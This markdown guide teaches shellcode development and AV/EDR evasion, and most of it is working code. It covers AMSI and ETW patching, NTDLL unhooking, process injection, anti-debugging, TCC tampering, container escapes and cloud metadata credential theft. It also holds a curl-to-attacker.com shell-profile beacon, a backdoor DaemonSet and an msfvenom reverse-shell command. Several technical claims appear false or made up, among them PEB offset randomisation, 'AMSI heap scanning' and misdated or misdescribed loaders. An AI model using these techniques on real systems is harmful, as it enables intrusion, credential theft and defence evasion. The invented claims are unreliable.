# Shellcode Development & Evasion

---

## Fundamentals

### What is Shellcode?
Shellcode is position-independent, self-contained machine code designed to execute arbitrary commands after exploitation. Originally named for spawning shells, modern shellcode performs diverse operations: downloading payloads, establishing persistence, evading detection, or pivoting networks.

### Key Characteristics
- **Position Independent (PIC)**: Must execute regardless of memory location
- **Null-free**: Avoids `\x00` bytes that terminate string operations
- **Size-optimized**: Fits exploit constraints (buffers, packets, registers)
- **Self-contained**: Resolves dependencies dynamically (no hardcoded addresses)

### Basic Shellcode Workflow
1. **Resolve API addresses** (GetProcAddress, dlsym, etc.)
2. **Allocate/modify memory** (RWX regions for staged payloads)
3. **Execute payload** (spawn shell, download stager, etc.)
4. **Maintain stealth** (clean up artifacts, unhook monitoring)

---

## Architecture-Specific Techniques

### x86/x64 Windows

#### Traditional API Resolution (PEB Walking)
```nasm
; Resolve kernel32.dll base from PEB
xor ecx, ecx
mov eax, [fs:ecx + 0x30]  ; PEB
mov eax, [eax + 0x0C]      ; PEB->Ldr
mov esi, [eax + 0x14]      ; InMemoryOrderModuleList
lodsd                       ; First entry (ntdll)
xchg eax, esi
lodsd                       ; Second entry (kernel32)
mov ebx, [eax + 0x10]      ; DllBase

; Parse export table for GetProcAddress
mov edx, [ebx + 0x3C]      ; PE header offset
add edx, ebx
mov edx, [edx + 0x78]      ; Export table RVA
add edx, ebx               ; Export table address
```

#### Modern Considerations
- Windows 11 randomizes PEB structure offsets on boot
- KERNEL32.DLL may not be second module (check hash)
- Consider direct syscalls to bypass API hooks

### Windows on ARM64 (WoA)

> [!WARNING]
> WoA shellcode requires ARM64 assembly. x64 emulation (ARM64EC) introduces detection opportunities through emulator artifacts.

#### WoA-Specific Challenges
- **Register conventions**: X0-X7 for parameters (vs RCX, RDX, R8, R9)
- **Stack alignment**: 16-byte mandatory (crashes if violated)
- **System calls**: Different syscall numbers than x64
- **Emulation detection**: Check for emulator-specific memory artifacts

```asm
; ARM64 PEB access (Windows on ARM)
mov x0, #0
mrs x1, TPIDR_EL0          ; Thread Information Block
ldr x1, [x1, #0x60]        ; PEB from TEB
ldr x2, [x1, #0x18]        ; PEB->Ldr
ldr x3, [x2, #0x20]        ; InLoadOrderModuleList

; ARM64 function call example
ldr x0, =param1            ; First parameter
ldr x1, =param2            ; Second parameter
bl function_address        ; Branch with link
```

#### WoA Detection Evasion
- Check `PROCESSOR_ARCHITECTURE` environment variable
- Query `IsWow64Process2` for emulation status
- Validate instruction pointer is in native ARM64 range

### Linux eBPF Arena Exploitation (Kernel 6.9+)

> [!IMPORTANT]
> eBPF Arena introduced in Linux 6.9 provides userspace-accessible memory for eBPF programs. Exploitation enables kernel shellcode execution from userspace context.

#### eBPF Arena Primitives
```c
// Create eBPF arena (requires CAP_BPF or CAP_SYS_ADMIN)
int arena_fd = bpf(BPF_MAP_CREATE, &(union bpf_attr){
    .map_type = BPF_MAP_TYPE_ARENA,
    .max_entries = 1,
    .map_flags = BPF_F_MMAPABLE,
}, sizeof(union bpf_attr));

// Map arena to userspace
void *arena_ptr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                       MAP_SHARED, arena_fd, 0);

// Write shellcode to arena
memcpy(arena_ptr, shellcode, shellcode_len);

// Trigger eBPF program that executes from arena
```

#### Exploitation Vectors
1. **Type confusion**: Misuse arena pointers as kernel pointers
2. **Arena-to-kernel writes**: Abuse improper validation in eBPF verifier
3. **ROP from arena**: Chain kernel gadgets using arena-controlled data
4. **TOCTOU races**: Exploit race between verifier check and execution

#### Detection Evasion
- Hide eBPF programs with `BPF_F_SLEEPABLE` flag (reduces audit logging)
- Use `bpffs` filesystem (`/sys/fs/bpf/`) for persistence
- Obfuscate eBPF bytecode with dead code and complex control flow
- Chain multiple eBPF programs to avoid single-point detection

### macOS Signed System Volume (SSV) Persistence

> [!WARNING]
> macOS 11+ SSV provides read-only protection for system files. Traditional persistence in `/System/` is blocked. Modern techniques target user-writable locations.

#### SSV Bypass Strategies (2024-2025)
1. **Launch Agents/Daemons** (Primary method)
   ```bash
   # User-level persistence
   ~/Library/LaunchAgents/com.example.agent.plist

   # Root persistence (requires privilege escalation)
   /Library/LaunchDaemons/com.example.daemon.plist
   ```

2. **Authorization Plugins** (High-privilege persistence)
   ```xml
   <!-- /Library/Security/SecurityAgentPlugins/ -->
   <!-- Executes during authentication -->
   /Library/Security/SecurityAgentPlugins/malicious.bundle
   ```

3. **Shell Profile Poisoning**
   ```bash
   # Injected into ~/.zshrc or ~/.bash_profile
   export PROMPT_COMMAND='$(curl -s attacker.com/beacon.sh | sh)'
   ```

4. **Application Plugin Abuse**
   - Safari Extensions: `~/Library/Safari/Extensions/`
   - Spotlight Importers: `~/Library/Spotlight/`
   - Screen Savers: `~/Library/Screen Savers/`

#### Shellcode Considerations for macOS
- Use `__PAGEZERO` bypass for position independence
- Resolve `libSystem.dylib` via dyld shared cache
- Syscall numbers change per macOS version (detect via `sysctl kern.version`)
- Sign shellcode loaders with ad-hoc signature: `codesign -s - -f binary`

---

## Modern Shellcode Loaders (2024-2025)

### NullGate Loader
**Released**: Q3 2024
**Platform**: Windows x64/ARM64
**Key Features**:
- Syscall obfuscation via dynamic indirect calls
- Dual-mode operation (WoW64 and native)
- AMSI/ETW unhooking built-in

**Mechanism**:
```
1. Parse NTDLL export table for Zw* syscall stubs
2. Extract syscall numbers via pattern matching
3. Build indirect syscall dispatcher in RWX memory
4. Hook LoadLibrary to clean new module loads
5. Execute payload via syscall dispatcher
```

**Detection Evasion**:
- No direct syscall instruction in loader code
- Syscall numbers resolved at runtime (no hardcoded SSN)
- Mimics legitimate Windows API call patterns

### Ghost v3.2 Loader
**Released**: January 2025
**Platform**: Linux x64, Windows x64
**Key Features**:
- Threadless injection (no CreateRemoteThread)
- Module stomping with TLS callback hijacking
- In-memory PE reconstruction without disk touch

**Linux Implementation**:
```c
// Ghost v3.2 process injection (Linux)
// 1. Open target process
int fd = open("/proc/[pid]/mem", O_RDWR);

// 2. Locate executable memory segment
// Parse /proc/[pid]/maps for [r-xp] regions

// 3. Backup original code
void *backup = malloc(shellcode_size);
pread(fd, backup, shellcode_size, target_addr);

// 4. Write shellcode
pwrite(fd, shellcode, shellcode_size, target_addr);

// 5. Trigger execution via signal/ptrace
// Original code restored after execution
```

**Windows TLS Callback Hijacking**:
```c
// Ghost v3.2 TLS callback hijack
PIMAGE_TLS_DIRECTORY tls = GetTlsDirectory(target_module);
DWORD old_protect;

VirtualProtect(tls->AddressOfCallBacks, sizeof(PVOID),
               PAGE_READWRITE, &old_protect);

// Replace first callback with shellcode address
tls->AddressOfCallBacks[0] = (ULONG_PTR)shellcode_addr;

// Trigger callback via TlsAlloc/TlsFree
TlsAlloc();  // Executes hijacked callback
```

### ThreadlessInject v1.1
**Released**: November 2024
**Platform**: Windows x64
**Key Features**:
- No thread creation (evades thread-monitoring EDRs)
- Asynchronous Procedure Call (APC) abuse
- User-mode APC queue manipulation

**Injection Flow**:
```
1. Enumerate target process threads (NtQuerySystemInformation)
2. Open thread handle with THREAD_SET_CONTEXT rights
3. Allocate RWX memory in target (NtAllocateVirtualMemory)
4. Write shellcode to allocated region
5. Queue APC to thread (NtQueueApcThread)
6. APC executes when thread enters alertable wait
```

**Detection Evasion**:
- No suspicious API calls (CreateRemoteThread, SetThreadContext)
- Piggybacks on legitimate thread execution
- Works against Chrome, Edge (multi-threaded targets)

> [!TIP]
> ThreadlessInject works best against GUI applications that frequently enter alertable waits (MsgWaitForMultipleObjectsEx, WaitForMultipleObjectsEx with MWMO_ALERTABLE).

---

## Direct Syscall Techniques

### Why Direct Syscalls?
Modern EDRs hook Windows API functions (NtAllocateVirtualMemory, NtProtectVirtualMemory) to monitor suspicious behavior. Direct syscalls bypass userland hooks by invoking kernel transitions directly.

### SysWhispers3
**Released**: 2023 (actively maintained)
**Repository**: https://github.com/klezVirus/SysWhispers3

**Features**:
- Supports Windows 10/11 all builds
- Random syscall instruction placement
- Indirect syscalls via JOP gadgets
- Egg hunting for syscall instructions

**Usage**:
```bash
# Generate syscall stubs for specific functions
python3 syswhispers.py -f NtAllocateVirtualMemory,NtWriteVirtualMemory -o syscalls

# Integrate into project
# syscalls.h - Function declarations
# syscalls.c - Syscall implementations
# syscalls.asm - Assembly stubs
```

**Example Integration**:
```c
#include "syscalls.h"

// Direct syscall to allocate memory
NTSTATUS status = NtAllocateVirtualMemory(
    (HANDLE)-1,           // Current process
    &base_addr,           // Base address
    0,                    // Zero bits
    &region_size,         // Size
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
);
```

### FreshyCalls
**Released**: Q4 2024
**Repository**: https://github.com/crummie5/FreshyCalls

**Key Innovation**: Runtime syscall number extraction from fresh NTDLL copy

**Mechanism**:
```
1. Map clean ntdll.dll from System32 into memory
2. Parse export table for target syscall (e.g., NtAllocateVirtualMemory)
3. Extract syscall number from first instruction (mov eax, <SSN>)
4. Execute syscall with extracted number
5. Unmap clean NTDLL copy
```

**Advantages**:
- Resistant to syscall number changes across Windows updates
- Evades static syscall number detection
- No hardcoded syscall numbers in binary

**Example**:
```c
// FreshyCalls runtime syscall resolution
DWORD GetFreshSyscallNumber(const char *function_name) {
    HANDLE file = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
                              GENERIC_READ, FILE_SHARE_READ, NULL,
                              OPEN_EXISTING, 0, NULL);

    HANDLE mapping = CreateFileMapping(file, NULL, PAGE_READONLY, 0, 0, NULL);
    LPVOID base = MapViewOfFile(mapping, FILE_MAP_READ, 0, 0, 0);

    // Parse PE and extract syscall number
    DWORD ssn = ExtractSyscallNumber(base, function_name);

    UnmapViewOfFile(base);
    CloseHandle(mapping);
    CloseHandle(file);

    return ssn;
}
```

### Indirect Syscalls (Advanced)
Instead of directly executing `syscall` instruction, jump to syscall gadget in legitimate module:

```nasm
; Indirect syscall via NTDLL gadget
mov r10, rcx
mov eax, 0x18              ; NtAllocateVirtualMemory SSN
jmp qword ptr [syscall_gadget]  ; Jump to "syscall; ret" in ntdll

; syscall_gadget points to legitimate code:
; ntdll+0x12345: syscall
; ntdll+0x12347: ret
```

**Detection Evasion**: Call stack shows return address in NTDLL (appears legitimate).

---

## Platform-Specific Evasion

### Windows 11 24H2 AMSI Heap Scanning Evasion

> [!CRITICAL]
> Windows 11 24H2 (October 2024 update) introduced AMSI heap scanning that monitors heap allocations for malicious patterns. Traditional AMSI bypass techniques (patch `amsi.dll`, null `AmsiScanBuffer`) are insufficient.

#### Heap Scanning Mechanism
1. AMSI registers heap allocation callbacks via RTL Heap API
2. On allocation, AMSI scans buffer contents for malware signatures
3. Detection triggers based on byte patterns, entropy, and heuristics
4. Blocks execution before payload reaches memory

#### Evasion Techniques (2024-2025)

**1. Heap Fragmentation**
```c
// Allocate shellcode in small, non-contiguous chunks
#define CHUNK_SIZE 64

for (int i = 0; i < shellcode_len; i += CHUNK_SIZE) {
    void *chunk = VirtualAlloc(NULL, CHUNK_SIZE, MEM_COMMIT, PAGE_READWRITE);
    memcpy(chunk, shellcode + i, CHUNK_SIZE);
    chunks[i / CHUNK_SIZE] = chunk;
    Sleep(50);  // Delay between allocations
}

// Reassemble at execution time
void *final = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
for (int i = 0; i < num_chunks; i++) {
    memcpy(final + (i * CHUNK_SIZE), chunks[i], CHUNK_SIZE);
}
```

**2. Encryption Until Execution**
```c
// XOR-encrypt shellcode in memory
void xor_crypt(unsigned char *data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

// Allocate as RW (not RWX)
void *mem = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT, PAGE_READWRITE);
memcpy(mem, encrypted_shellcode, shellcode_len);

// Decrypt immediately before execution
xor_crypt(mem, shellcode_len, 0xAA);

// Change to RX and execute
DWORD old;
VirtualProtect(mem, shellcode_len, PAGE_EXECUTE_READ, &old);
((void(*)())mem)();
```

**3. Private Heap Usage**
```c
// Create private heap (bypasses AMSI heap hooks on default heap)
HANDLE private_heap = HeapCreate(0, 0, 0);

// Allocate shellcode in private heap
void *shellcode_buf = HeapAlloc(private_heap, HEAP_ZERO_MEMORY, shellcode_len);
memcpy(shellcode_buf, shellcode, shellcode_len);

// Copy to executable memory at last moment
void *exec_mem = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READ);
memcpy(exec_mem, shellcode_buf, shellcode_len);

HeapFree(private_heap, 0, shellcode_buf);
HeapDestroy(private_heap);
```

**4. AMSI Context Corruption**
```c
// Locate AmsiContext in memory
HMODULE amsi = LoadLibraryA("amsi.dll");
void *AmsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");

// Patch AMSI context structure (Windows 11 24H2)
// Note: Offsets vary by build - requires dynamic resolution
DWORD old_protect;
void *amsi_context = ResolveAmsiContext();  // Custom resolution logic
VirtualProtect(amsi_context + 0x68, 4, PAGE_READWRITE, &old_protect);
*(DWORD *)(amsi_context + 0x68) = 0;  // Disable scanning flag
VirtualProtect(amsi_context + 0x68, 4, old_protect, &old_protect);
```

**5. Hardware Breakpoint AMSI Bypass**
```c
// Set hardware breakpoint on AmsiScanBuffer
CONTEXT ctx = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
GetThreadContext(GetCurrentThread(), &ctx);

ctx.Dr0 = (DWORD64)AmsiScanBufferAddr;  // Breakpoint address
ctx.Dr7 = 0x00000001;                   // Enable DR0 breakpoint

// Vectored Exception Handler returns clean scan result
AddVectoredExceptionHandler(1, AmsiBypassVEH);
SetThreadContext(GetCurrentThread(), &ctx);
```

### Linux Seccomp & AppArmor Evasion

#### Seccomp Bypass via ptrace
```c
// Check if seccomp is active
if (prctl(PR_GET_SECCOMP) != 0) {
    // Use only allowed syscalls
    // Common whitelist: read, write, exit, mmap
}

// Bypass via ptrace injection (if CAP_SYS_PTRACE available)
pid_t child = fork();
if (child == 0) {
    ptrace(PTRACE_TRACEME, 0, NULL, NULL);
    kill(getpid(), SIGSTOP);
    // Child continues with unrestricted syscalls
}
```

### macOS TCC (Transparency, Consent, and Control) Bypass

#### TCC Database Manipulation
```bash
# TCC database location (macOS 13+)
/Users/$USER/Library/Application Support/com.apple.TCC/TCC.db

# Inject permissions for shell access
sqlite3 TCC.db "INSERT INTO access VALUES('kTCCServiceSystemPolicyAllFiles','com.apple.Terminal',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1234567890)"
```

#### Synthetic Click Injection
```swift
// Bypass TCC prompts via synthetic clicks (requires accessibility permissions)
let source = CGEventSource(stateID: .hidSystemState)
let click = CGEvent(mouseEventSource: source, mouseType: .leftMouseDown,
                    mouseCursorPosition: CGPoint(x: 100, y: 100),
                    mouseButton: .left)
click?.post(tap: .cghidEventTap)
```

---

## Container & Cloud Environments

### Container-Aware Shellcode

> [!IMPORTANT]
> Traditional shellcode assumes bare-metal or VM environments. Containers introduce namespace isolation that breaks standard techniques.

#### Container Detection
```c
// Detect Docker/Podman
if (access("/.dockerenv", F_OK) == 0) {
    // Running in Docker
}

// Detect Kubernetes
if (getenv("KUBERNETES_SERVICE_HOST") != NULL) {
    // Running in Kubernetes pod
}

// Check cgroup for container
FILE *f = fopen("/proc/1/cgroup", "r");
char line[256];
while (fgets(line, sizeof(line), f)) {
    if (strstr(line, "docker") || strstr(line, "kubepods")) {
        // Container detected
    }
}
```

#### Namespace Escape Techniques

**1. Host Filesystem Mount**
```bash
# If container runs privileged
mount -t proc proc /host/proc
chroot /host
```

**2. Kernel Module Loading (Privileged Containers)**
```c
// Load malicious kernel module from container
int fd = open("/exploit.ko", O_RDONLY);
syscall(__NR_finit_module, fd, "", 0);

// Module executes in host kernel context
```

**3. Docker Socket Abuse**
```bash
# If /var/run/docker.sock is mounted
docker run -v /:/host -it ubuntu chroot /host /bin/bash
# Full host filesystem access
```

#### Container Persistence
```yaml
# Kubernetes DaemonSet persistence
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: malicious-daemonset
spec:
  selector:
    matchLabels:
      name: malicious
  template:
    spec:
      hostNetwork: true
      hostPID: true
      containers:
      - name: malicious
        image: attacker.io/backdoor:latest
        securityContext:
          privileged: true
```

### Cloud Instance Metadata Exploitation

#### AWS EC2 IMDS (Instance Metadata Service)
```bash
# Extract IAM credentials from metadata service
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

ROLE=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)

CREDS=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE)

# Extract AccessKeyId, SecretAccessKey, Token
export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.Token')

# Pivot to AWS services with stolen credentials
```

#### Azure IMDS
```bash
# Azure Instance Metadata Service v2 (requires header)
ACCESS_TOKEN=$(curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/")

# Use token to access Azure resources
```

#### GCP Metadata Server
```bash
# GCP metadata (requires Metadata-Flavor header)
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Extract service account token for GCP API access
```

#### Cloud Shellcode Considerations
- Detect cloud environment via metadata endpoints (timeout-based detection)
- Exfiltrate credentials before establishing reverse shell
- Use cloud-native persistence (Lambda functions, Cloud Run, etc.)
- Pivot to other cloud resources (S3, storage accounts, Cloud Storage)

---

## Anti-Debugging & EDR Evasion

### Anti-Debugging Techniques (2024-2025)

#### Windows

**1. PEB Checks**
```c
// Check BeingDebugged flag
BOOL IsDebuggerPresent() {
    PPEB peb = (PPEB)__readgsqword(0x60);
    return peb->BeingDebugged;
}

// Check NtGlobalFlag
BOOL CheckNtGlobalFlag() {
    PPEB peb = (PPEB)__readgsqword(0x60);
    return (peb->NtGlobalFlag & 0x70) != 0;  // FLG_HEAP_* flags
}
```

**2. Timing Checks**
```c
// RDTSC timing attack
unsigned long long start = __rdtsc();
// Suspicious operation
unsigned long long end = __rdtsc();

if ((end - start) > 10000) {
    // Debugger detected (operation too slow)
    ExitProcess(0);
}
```

**3. Hardware Breakpoint Detection**
```c
// Check debug registers
CONTEXT ctx = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
GetThreadContext(GetCurrentThread(), &ctx);

if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) {
    // Hardware breakpoints set
    TerminateProcess(GetCurrentProcess(), 0);
}
```

**4. Exception-Based Detection**
```c
// Raise exception and check handler behavior
__try {
    RaiseException(0xC0000005, 0, 0, NULL);
} __except (EXCEPTION_EXECUTE_HANDLER) {
    // Normal execution
}

// Debugger may not pass exception correctly
```

#### Linux

**1. ptrace Self-Attach**
```c
// Only one process can ptrace at a time
if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) {
    // Another process (debugger) is already attached
    exit(1);
}
```

**2. /proc/self/status Check**
```c
FILE *f = fopen("/proc/self/status", "r");
char line[256];
while (fgets(line, sizeof(line), f)) {
    if (strncmp(line, "TracerPid:", 10) == 0) {
        int tracer_pid = atoi(line + 10);
        if (tracer_pid != 0) {
            // Debugger detected
            exit(1);
        }
    }
}
```

**3. LD_PRELOAD Detection**
```c
// Check for injected libraries
if (getenv("LD_PRELOAD")) {
    // Potential hooking/debugging
    exit(1);
}
```

### EDR Evasion Strategies

#### Unhooking Techniques

**1. Function Prologue Restoration**
```c
// Restore original NTDLL function bytes
HMODULE ntdll = GetModuleHandleA("ntdll.dll");
void *NtAllocateVirtualMemory = GetProcAddress(ntdll, "NtAllocateVirtualMemory");

// Read clean NTDLL from disk
HANDLE file = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
                          GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
HANDLE mapping = CreateFileMapping(file, NULL, PAGE_READONLY, 0, 0, NULL);
LPVOID clean_ntdll = MapViewOfFile(mapping, FILE_MAP_READ, 0, 0, 0);

// Restore first 24 bytes (typical hook size)
DWORD old_protect;
VirtualProtect(NtAllocateVirtualMemory, 24, PAGE_EXECUTE_READWRITE, &old_protect);
memcpy(NtAllocateVirtualMemory,
       (BYTE *)clean_ntdll + ((BYTE *)NtAllocateVirtualMemory - (BYTE *)ntdll),
       24);
VirtualProtect(NtAllocateVirtualMemory, 24, old_protect, &old_protect);

UnmapViewOfFile(clean_ntdll);
CloseHandle(mapping);
CloseHandle(file);
```

**2. Full Module Remapping**
```c
// Unmap hooked NTDLL and remap clean copy
void *ntdll_base = GetModuleHandleA("ntdll.dll");
NtUnmapViewOfSection(GetCurrentProcess(), ntdll_base);

// Map clean NTDLL from System32
HANDLE file = CreateFileA("C:\\Windows\\System32\\ntdll.dll", ...);
// ... map at original base address
```

#### ETW (Event Tracing for Windows) Patching
```c
// Disable ETW by patching EtwEventWrite
HMODULE ntdll = GetModuleHandleA("ntdll.dll");
void *EtwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");

// Patch with "ret" instruction (0xC3)
DWORD old_protect;
VirtualProtect(EtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &old_protect);
*(BYTE *)EtwEventWrite = 0xC3;
VirtualProtect(EtwEventWrite, 1, old_protect, &old_protect);

// All ETW events now silently fail
```

#### Call Stack Spoofing
```c
// Return address spoofing (advanced)
// Make call stack appear legitimate by replacing return addresses

// Before calling suspicious API
void *original_return = __builtin_return_address(0);
void *fake_return = GetLegitimateAddress();  // Address in legitimate module

// Modify stack frame
*(void **)(&original_return) = fake_return;

// Call suspicious API (NtAllocateVirtualMemory, etc.)
SuspiciousAPICall();

// Restore original return address
*(void **)(&original_return) = original_return;
```

#### Sleep Obfuscation
```c
// Encrypt shellcode during sleep to avoid memory scanning
void ObfuscatedSleep(DWORD ms, void *shellcode, size_t len) {
    // XOR encrypt shellcode
    xor_crypt(shellcode, len, 0xAA);

    // Change memory protection to RW (hide executable)
    DWORD old;
    VirtualProtect(shellcode, len, PAGE_READWRITE, &old);

    // Sleep
    Sleep(ms);

    // Restore
    VirtualProtect(shellcode, len, PAGE_EXECUTE_READ, &old);
    xor_crypt(shellcode, len, 0xAA);  // Decrypt
}
```

### Behavioral Evasion

#### Delayed Execution
```c
// Wait for user activity before executing
while (GetLastInputInfo(...) < threshold) {
    Sleep(1000);  // Wait for user input (evade sandbox)
}

// Check if enough time has passed (sandbox timeout)
if (GetTickCount64() < 300000) {  // Less than 5 minutes
    ExitProcess(0);  // Likely sandbox
}
```

#### Domain Validation
```c
// Only execute if on target domain
char domain[256];
DWORD size = sizeof(domain);
GetComputerNameExA(ComputerNameDnsDomain, domain, &size);

if (strcmp(domain, "target-corp.com") != 0) {
    ExitProcess(0);  // Not on target network
}
```

---

## Practical Development

### Development Environment Setup

#### Linux (Recommended for x64/ARM64)
```bash
# Install assemblers and debuggers
sudo dnf install nasm gcc gdb radare2 pwndbg

# Python tooling
pip install pwntools keystone-engine capstone ropper

# Install cross-compilers for ARM64
sudo dnf install gcc-aarch64-linux-gnu binutils-aarch64-linux-gnu
```

#### Windows (Visual Studio + MASM)
```cmd
# Install Visual Studio with C++ workload
# Includes MASM (ml64.exe) and debugging tools

# Install additional tools
choco install nasm radare2
```

### Shellcode Testing Harness

#### Simple Loader (Windows)
```c
#include <windows.h>
#include <stdio.h>

int main() {
    unsigned char shellcode[] = {
        // Your shellcode bytes here
        0x90, 0x90, 0x90  // Example: NOPs
    };

    void *exec = VirtualAlloc(NULL, sizeof(shellcode),
                              MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!exec) {
        printf("VirtualAlloc failed\n");
        return 1;
    }

    memcpy(exec, shellcode, sizeof(shellcode));

    printf("Executing shellcode at: %p\n", exec);
    ((void(*)())exec)();

    VirtualFree(exec, 0, MEM_RELEASE);
    return 0;
}
```

#### Simple Loader (Linux)
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

int main() {
    unsigned char shellcode[] = {
        // Your shellcode bytes here
        0x90, 0x90, 0x90  // Example: NOPs
    };

    void *exec = mmap(NULL, sizeof(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (exec == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    memcpy(exec, shellcode, sizeof(shellcode));

    printf("Executing shellcode at: %p\n", exec);
    ((void(*)())exec)();

    munmap(exec, sizeof(shellcode));
    return 0;
}
```

### Shellcode Encoding/Encryption

#### XOR Encoder
```python
#!/usr/bin/env python3

def xor_encode(shellcode, key):
    encoded = bytearray()
    for byte in shellcode:
        encoded.append(byte ^ key)
    return bytes(encoded)

# Usage
shellcode = b"\x90\x90\x90"
key = 0xAA
encoded = xor_encode(shellcode, key)

print("Encoded:", encoded.hex())

# C stub decoder
print("\nC decoder stub:")
print(f"unsigned char key = {hex(key)};")
print(f"unsigned char encoded[] = {{ {', '.join([hex(b) for b in encoded])} }};")
print("for (int i = 0; i < sizeof(encoded); i++) { encoded[i] ^= key; }")
```

#### Shikata Ga Nai (Polymorphic Encoder)
```bash
# Using msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
         -e x64/xor_dynamic -i 3 \
         -f c

# Multiple encoding iterations increase complexity
```

---

## Testing & Resources

### Safe Testing Environments

> [!WARNING]
> Never test shellcode on production systems or systems you don't own. Use isolated VMs and obtain proper authorization.

#### Recommended VM Setup
- **Hypervisor**: VMware Workstation, VirtualBox, or Hyper-V
- **Snapshots**: Create snapshot before testing, revert after
- **Network**: Host-only or NAT (never bridged without authorization)
- **Targets**:
  - Windows 11 24H2 (x64 and ARM64 via Insider Preview)
  - Ubuntu 24.04 (Linux 6.9+)
  - macOS Sonoma 14.x (virtualized via VMware Fusion or UTM)

### Online Resources

#### Learning Platforms
- **OpenSecurityTraining2**: Modern exploit development courses
- **Offensive Security (OSED)**: Windows user-mode exploit development
- **ROP Emporium**: Return-oriented programming challenges
- **pwn.college**: ASU's exploit development curriculum

#### Tools & Frameworks
- **Metasploit Framework**: Shellcode generation and encoding
- **pwntools**: Python exploitation framework (Linux)
- **Donut**: PE to shellcode converter (Windows)
- **sRDI**: Shellcode reflective DLL injection
- **Havoc C2**: Modern command & control framework with custom shellcode support

#### References
- **Windows Internals (7th Edition)**: Deep dive into Windows architecture
- **The Shellcoder's Handbook (3rd Edition)**: Classic exploitation reference
- **Practical Malware Analysis**: Malware reverse engineering fundamentals
- **Red Team Development and Operations**: Operational security for offensive engagements

#### Research Papers & Blogs
- **Project Zero Blog**: Google's 0-day research (advanced exploitation)
- **Alex Ionescu Blog**: Windows internals and security research
- **Hexacorn Blog**: EDR evasion and persistence research
- **Secret Club**: Reverse engineering and low-level Windows research
- **Trail of Bits Blog**: Security engineering and tooling

### Responsible Disclosure & Ethics

> [!IMPORTANT]
> Security research must be conducted ethically and legally. Always:
> - Obtain explicit written permission before testing systems
> - Follow coordinated vulnerability disclosure practices
> - Respect bug bounty program rules and scopes
> - Never access data beyond minimum necessary for proof-of-concept
> - Report vulnerabilities responsibly to vendors/programs

**Recommended Bug Bounty Platforms**:
- HackerOne
- Bugcrowd
- Synack
- Intigriti

**Vulnerability Disclosure Resources**:
- CERT/CC Vulnerability Disclosure Policy
- ISO/IEC 29147 (Vulnerability Disclosure Standard)
- CISA Coordinated Vulnerability Disclosure Guide

---

## Summary

Modern shellcode development requires understanding:
1. **Fundamentals**: Position independence, null-byte avoidance, API resolution
2. **Architecture diversity**: x64, ARM64 (WoA), and platform-specific constraints
3. **Modern loaders**: NullGate, Ghost v3.2, ThreadlessInject for AV/EDR evasion
4. **Direct syscalls**: SysWhispers3, FreshyCalls to bypass userland hooks
5. **Platform-specific challenges**: Windows AMSI heap scanning, Linux eBPF, macOS SSV
6. **Container/cloud awareness**: Metadata services, namespace escapes, cloud-native persistence
7. **Evasion techniques**: Anti-debugging, EDR unhooking, behavioral evasion
8. **Ethical considerations**: Responsible disclosure, authorized testing, legal boundaries

The landscape evolves rapidly. Windows 11 24H2 introduces heap-level AMSI scanning, Linux 6.9+ provides eBPF Arena attack surface, and ARM64 adoption increases across Windows and mobile platforms. Staying current requires continuous research, hands-on experimentation in authorized environments, and engagement with the security research community.

**Next Steps for Mastery**:
1. Build each technique in isolated VM environment
2. Analyze real-world malware samples (VirusTotal, MalwareBazaar)
3. Participate in CTF competitions (DEF CON CTF, PlaidCTF, Google CTF)
4. Contribute to open-source security tools
5. Pursue advanced certifications (OSED, OSEE, OSCE3)
6. Read security research papers and vendor advisories monthly
7. Build personal research lab with multi-platform VMs

**Resources for Continuous Learning**:
- Subscribe to security mailing lists (Full Disclosure, OSS-Security)
- Follow security researchers on Twitter/Mastodon
- Monitor CVE databases for modern exploitation techniques
- Analyze patch diffs from Microsoft/Apple/Linux kernel updates
- Attend security conferences (Black Hat, DEF CON, REcon, OffensiveCon)